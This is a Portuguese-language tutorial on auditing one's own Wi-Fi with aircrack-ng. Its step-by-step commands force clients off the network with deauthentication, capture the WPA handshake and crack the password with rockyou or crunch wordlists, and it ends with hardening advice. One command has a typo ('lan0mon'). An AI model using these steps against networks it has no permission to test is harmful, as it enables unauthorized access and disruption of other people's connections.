### 🧪 Guia Prático: Testando a Segurança do Seu Wi-Fi no Ubuntu

## 1️⃣ Instalar Ferramentas Necessárias
	sudo apt update
	sudo apt install aircrack-ng crunch
	
---
### 2️⃣ Identificar e Ativar Modo Monitor
###### Veja suas interfaces Wi-Fi:
	sudo airmon-ng

###### Ative o modo monitor (troque `wlan0` pelo nome da sua interface):
	sudo airmon-ng start wlan0

###### Confirme se entrou em modo monitor:
	iwconfig

Você deve ver `Mode: Monitor` para a interface.

---
### 3️⃣ Escanear Redes Wi-Fi
	sudo airodump-ng wlan0mon

- **Anote:**
    - **BSSID** → MAC do seu roteador
    - **CH** → Canal usado
    - **ESSID** → Nome da rede

Pressione `CTRL+C` para parar.

---
### 4️⃣ Capturar Handshake
###### Troque `[CANAL]` e `[BSSID]` pelos dados da sua rede:
	sudo airodump-ng -c [CANAL] --bssid [BSSID] -w captura lan0mon


Deixe rodando. Agora vamos gerar tráfego para forçar um cliente a se reconectar:

###### Em outro terminal:
	sudo aireplay-ng --deauth 5 -a [BSSID] wlan0mon

Quando o `airodump-ng` mostrar **WPA handshake** no topo da tela, você pode parar com `CTRL+C`.

Isso vai gerar um arquivo `captura-01.cap`.

---
### 5️⃣ Quebrar a Senha

###### Use uma wordlist. O Kali vem com a famosa `rockyou.txt`, mas no Ubuntu você pode baixá-la:
	sudo apt install wordlists

###### Depois rode:
	aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt

Se a senha estiver na lista, ele vai exibir algo assim:
	KEY FOUND! [ MinhaSenha123 ]

---
### 6️⃣ (Opcional) Criar Sua Própria Wordlist
Se quiser gerar combinações específicas, use `crunch`.  

###### Exemplo: gerar senhas de 8 a 10 caracteres com letras e números:
	crunch 8 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -o minha-wordlist.txt

###### E depois usar no `aircrack-ng`:
	aircrack-ng captura-01.cap -w minha-wordlist.txt

---
### 🛡 Após o Teste
Se você conseguiu quebrar sua senha rapidamente:
- Troque para uma senha **mais longa e complexa** (12+ caracteres).
- Desative **WPS** no roteador.
- Use **WPA2-AES** ou **WPA3**.